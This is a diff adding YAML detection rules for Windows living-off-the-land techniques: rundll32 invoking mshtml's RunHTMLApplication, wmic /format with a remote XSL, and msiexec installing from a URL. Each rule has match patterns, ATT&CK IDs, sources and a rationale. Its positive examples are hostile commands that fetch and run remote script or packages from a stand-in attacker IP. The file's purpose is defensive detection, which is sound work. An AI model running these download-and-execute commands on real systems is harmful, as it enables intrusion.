+    url: https://github.com/LOLBAS-Project/LOLBAS/blob/98a39d57b0a3873d635cd5594f2dbffa83891bc3/yml/OSBinaries/Rundll32.yml
+    license: GPL-3.0
+    upstream_id: Rundll32.exe
+  rationale: >-
+    'rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";...' abuses mshtml to run script, typically to fetch a
+    remote scriptlet; Windows components never call rundll32 with a javascript: argument.
+  examples:
+    positive:
+      - 'rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://203.0.113.7/a.sct")'
+    negative:
+      - 'rundll32.exe shell32.dll,Control_RunDLL desk.cpl'
+      - 'C:\Windows\System32\rundll32.exe C:\Windows\System32\printui.dll,PrintUIEntry /il'
+
+- id: mention.cradle_mshtml_runhtmlapplication
+  title: mshtml RunHTMLApplication entry point
+  match:
+    literal: [',RunHTMLApplication']
+  case_sensitive: false
+  strength: strong
+  attack: [T1218.011]
+  telemetry: [any]
+  source:
+    name: LOLBAS project, Rundll32.exe
+    url: https://github.com/LOLBAS-Project/LOLBAS/blob/98a39d57b0a3873d635cd5594f2dbffa83891bc3/yml/OSBinaries/Rundll32.yml
+    license: GPL-3.0
+    upstream_id: Rundll32.exe
+  rationale: >-
+    Calling mshtml's RunHTMLApplication export from rundll32 executes HTA script outside mshta; it shows up only in
+    the rundll32 script-execution technique and in Poweliks-style fileless malware.
+  examples:
+    positive:
+      - 'rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";eval("w=new ActiveXObject(\"WScript.Shell\");")'
+    negative:
+      - 'rundll32.exe C:\Windows\System32\mshtml.dll,PrintHTML "C:\Temp\page.htm"'
+      - 'rundll32.exe url.dll,FileProtocolHandler https://intranet.example.org/'
+
+- id: mention.cradle_wmic_remote_xsl
+  title: 'wmic /format: argument with a URL or UNC path (SquiblyTwo text)'
+  match:
+    anchored: 'wmic(?:\.exe)?["'']? [^\n]{0,150}[/-]format:["'']?(?:https?://|\\\\)'
+  case_sensitive: false
+  strength: strong
+  attack: [T1220, T1047]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Potential Remote SquiblyTwo Technique Execution (Markus Neis, Florian Roth, Swachchhanda Shrawan Poudel)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_wmic_squiblytwo_bypass.yml
+    license: DRL-1.1
+    upstream_id: 8d63dadf-b91b-4187-87b6-34a1114577ea
+  rationale: >-
+    WMIC's /format switch loads an XSL stylesheet that can embed script; a URL or UNC path there runs remote script
+    under a signed binary. Built-in formats are names like csv or list, not URLs.
+  examples:
+    positive:
+      - 'wmic os get /format:"http://203.0.113.7/a.xsl"'
+      - 'wmic process list /FORMAT:\\203.0.113.7\share\evil.xsl'
+    negative:
+      - 'wmic os get caption,version /format:list'
+      - 'wmic logicaldisk get name,freespace /format:csv'
+
+- id: mention.cradle_msiexec_remote
+  title: 'msiexec /i or /package argument with a URL'
+  match:
+    anchored: 'msiexec(?:\.exe)?["'']? [^\n]{0,60}[/-](?:i|package) {0,2}["'']?https?://'
+  case_sensitive: false
+  strength: medium
+  attack: [T1218.007, T1105]
+  telemetry: [any]
+  source:
+    name: LOLBAS project, Msiexec.exe
+    url: https://github.com/LOLBAS-Project/LOLBAS/blob/98a39d57b0a3873d635cd5594f2dbffa83891bc3/yml/OSBinaries/Msiexec.yml
+    license: GPL-3.0
+    upstream_id: Msiexec.exe
+  rationale: >-
+    'msiexec /q /i URL' installs (and runs custom actions from) a package straight from the web. Some software
+    deployment does install from internal web servers, so it is medium.
+  examples:
+    positive:
+      - 'msiexec /q /i http://203.0.113.7/update.msi'
+    negative:
+      - 'msiexec /i "C:\Installers\agent.msi" /qn'
+      - 'msiexec /x {11111111-2222-3333-4444-555555555555} /qn'
